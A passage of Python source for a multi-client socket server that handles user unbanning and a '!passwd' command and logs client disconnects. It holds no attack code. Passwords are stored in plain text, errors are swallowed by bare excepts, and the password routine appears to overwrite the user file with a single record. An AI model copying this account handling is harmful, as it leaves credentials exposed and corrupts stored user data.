                                    banned_users.remove(uname)
                                    save_files(banned_users, ban_file)
                                conn.send(f"\r\n\t{LIGHTRED}[{LIGHTYELLOW}+{LIGHTRED}] {LIGHTGREEN}User Unbanned Successfully\n".encode())
                            except:
                                pass
                    elif data.split()[0] == '!passwd':
                        users = load_files('src/users.json')
                        new_passwd = data.split()[1]
                        for user_id, details in usr.items():
                            if details.get('user') == user:
                                details['password'] = new_passwd
                                save_files(details , fpath)

                except:
                    pass
        except Exception as e:
            print(f"{red}[{yellow}+{red}] {green}Error with client {cyan}{addr} {red}: {cyan}{e}")
        finally:
            conn.close()
            online_users.remove(conn)
            print(f"\n{red}[{yellow}+{red}] {green}Client {cyan}{addr} {green}disconnected {white}User {red}: {cyan}{user}")
    except:
        pass

while True:
    try:
        conn , addr = s.accept()
        thr(target=app , args=(conn , addr)).start()
    except Exception as e:
        print(f"{red}[{yellow}+{red}] {green}Error accepting connection {red}: {cyan}{e}")
